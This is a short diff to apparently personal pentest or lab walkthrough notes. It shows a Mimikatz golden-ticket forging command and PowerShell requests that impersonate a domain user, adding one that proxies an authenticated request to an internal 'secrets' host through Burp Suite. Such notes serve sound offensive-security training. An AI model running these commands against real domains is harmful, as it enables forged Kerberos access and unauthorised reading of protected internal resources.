@@ -1456,6 +1456,9 @@ kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous
 
 # View the webpage after impersonating tony.ward user
 iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials
+
+# IF HOST UNABLE TO REACH THE SECRETS LOCATION DIRECTLY, PROXY TO BURPSUITE --> FORWARD TRAFFIC TO SECRETS LOCATIOn
+iwr http://vault01.denkiair-prod.com/Internal -UseBasicParsing -UseDefaultCredentials -Proxy http://192.168.45.219:8070 | Select-Object -Expand Content
 ```
 
 \-----OR use impacket-ticketer------
